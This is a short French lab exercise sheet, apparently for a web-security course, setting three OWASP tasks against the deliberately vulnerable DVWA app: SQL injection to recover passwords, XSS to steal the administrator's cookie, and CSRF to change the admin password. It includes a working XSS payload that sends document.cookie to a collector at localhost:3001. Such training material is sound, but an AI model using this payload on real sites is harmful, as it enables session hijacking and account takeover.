### TOP 10 OWASP

1. Dans l'application DVWA, en utilisant une injection sql, retrouvez les mots de passes des utilisateurs.
2. Dans l'application DVWA, en utilisant une injection xss, récupérez le cookie de l'adminstrateur.
```
<script>document.write('<img src="http://localhost:3001/cookie?cookie='+document.cookie+'" />')</script>
```

3. Dans l'application DVWA, en utilisant une vulnérabilité csrf, modifiez le mot de passe de l'admin